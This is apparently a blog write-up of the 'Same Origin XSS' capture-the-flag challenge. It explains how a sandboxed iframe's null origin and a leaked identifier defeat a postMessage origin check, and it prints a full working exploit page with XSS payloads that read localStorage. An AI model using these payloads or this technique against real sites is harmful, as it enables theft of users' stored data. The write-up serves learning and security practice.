In this blog, I am going to explain the solution for the Same Origin XSS challenge created by NDevTK and terjanq. I am around beginner to intermediate level in client-side security, so this challenge taught me a lot of things and I couldn't quite understand the solution on my first try. However, I'll be explaining it in the simplest form as per my ability.

1. Challenge objective (Simplified)

The main objective of this challenge is to read the localStorage.html property of https://so-xss.terjanq.me/iframe.php. The localStorage.html property is set whenever you save any code on https://so-xss.terjanq.me/. The /iframe.php page exposes a postMessage handler with the following code: 

const identifier = 'random_string';

onmessage = e => {
  const data = e.data;

  if (e.origin !== window.origin && data.identifier !== identifier)
    return;

  if (data.type === 'render') {
    renderContainer.innerHTML = data.body;
  }
}

We'll be working with this event handler throughout the challenge.

2. Challenge solution thought process

The message handler is fairly simple. In order to get the XSS, we first need to make if (e.origin !== window.origin && data.identifier !== identifier) evaluate to false so that execution doesn't stop before the rendering part.

The condition evaluates to true when the origin sending the message differs from the window's origin and the identifier sent with the message differs from the expected identifier. Because the code uses the && operator, making either comparison false is enough to make the complete condition false.

3. Sandbox iframes

We can create sandboxed iframes using the sandbox attribute:

<iframe
  src="https://mydomain.com"
  sandbox="allow-scripts allow-popups">
</iframe>

When an iframe is sandboxed without allow-same-origin, its content is treated as having an opaque origin. In the situations relevant to this challenge, this means its serialized origin is null. The sandbox also restricts capabilities unless they are explicitly allowed, such as scripts, popups, navigation, and modals.

Since this sandboxed context is no longer treated as the page's normal origin, it also cannot use that origin's normal storage access in the way an unsandboxed same-origin page can.

Another useful behavior here is that a popup opened from a sandboxed iframe can inherit sandbox restrictions unless the sandbox configuration allows it to escape them. Consider: 

<html>
<head><title>Demo</title></head>
<body>
  <h1>This is a test page</h1>

  <iframe
    src="https://mydomain.com"
    sandbox="allow-scripts allow-popups">
  </iframe>
</body>
</html>

And suppose mydomain.com contains:

<html>
<head><title>Demo</title></head>
<body>
  <h1>This is a test page</h1>

  <script>
    // Allowed because the iframe has allow-scripts.
    window.open("https://victimsite.com");
  </script>
</body>
</html>

In this setup, the opened page remains affected by the opener's sandbox restrictions. This behavior is the main trick used in the first part of the challenge.

4. Challenge solution

First, we can use the opaque-origin behavior to bypass the first comparison in the postMessage check: 

e.origin !== window.origin

If the sending context and receiving context both serialize their origins as null, the comparison becomes false. Because the complete check uses &&, the entire condition becomes false.

For example, the attacker page can contain:

<html>
<head><title>Demo</title></head>
<body>
  <h1>This is a test page</h1>

  <iframe
    src="https://attacker.com/iframe.html"
    sandbox="allow-scripts allow-popups">
  </iframe>
</body>
</html>

Then iframe.html opens the challenge page and sends the rendering message.

At this stage, arbitrary HTML can be rendered in the sandboxed challenge window. However, simply executing something equivalent to alert(localStorage.html) there does not solve the challenge because that opened page is still operating under the inherited sandbox restrictions and cannot access the target's normal origin storage.

To read the property, we need XSS execution inside an unsandboxed so-xss.terjanq.me/iframe.php page. The solution is to keep a reference to the original top-level attacker window, navigate that window to the challenge origin, and then use the already-compromised sandboxed window to send a second payload to it.

5. Final payload

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>My first writeup</title>
</head>
<body>

<script>
let iframe = document.createElement('iframe');

iframe.sandbox =
  'allow-scripts allow-popups allow-top-navigation';

let payload =
  "x=opener.top; opener.postMessage(1,'*'); " +
  "setTimeout(() => { " +
  "x.postMessage({type: 'render',identifier," +
  "body:'<img src=x onerror=alert(localStorage.html)>'}, '*'); " +
  "}, 1000)";

iframe.srcdoc = `
  <h1>hello</h1>

  <script>
    onclick = e => {
      let w = open('https://so-xss.terjanq.me/iframe.php');

      onmessage = e =>
        top.location = 'https://so-xss.terjanq.me/iframe.php';

      setTimeout(_ => {
        w.postMessage({
          type: "render",
          body: "<audio/src/onerror=\\\\"${payload}\\\\">"
        }, '*')
      }, 1000);
    };
  <\/script>
`;

document.body.appendChild(iframe);
</script>

</body>
</html>

First, the sandboxed iframe sends a payload using an audio element. The JavaScript executed by that payload is conceptually: 

x = opener.top;
opener.postMessage(1, '*');

setTimeout(() => {
  x.postMessage({
    type: 'render',
    identifier,
    body: '<img src=x onerror=alert(localStorage.html)>'
  }, '*');
}, 1000);

Here, x is assigned opener.top, which refers to the parent top-level page. The opened page then sends a message back to its opener. The opener has: 

onmessage = e =>
  top.location = 'https://so-xss.terjanq.me/iframe.php';

This navigates the top-level attacker page to https://so-xss.terjanq.me/iframe.php. Importantly, the earlier reference stored in x still refers to that window, but the window has now navigated to an unsandboxed page on the challenge origin.

The first bypass relied on both relevant origins being null. That no longer applies to the unsandboxed target. Instead, the second comparison can be made false: 

data.identifier !== identifier

The script running in the compromised challenge context has access to identifier, so it can include the correct value in the second postMessage. The final message is therefore: 

x.postMessage({
  type: 'render',
  identifier,
  body: '<img src=x onerror=alert(localStorage.html)>'
}, '*');

Now data.identifier !== identifier evaluates to false, the render branch executes in the unsandboxed same-origin page, and the injected handler can access localStorage.html.

And that concludes the solution for this challenge.
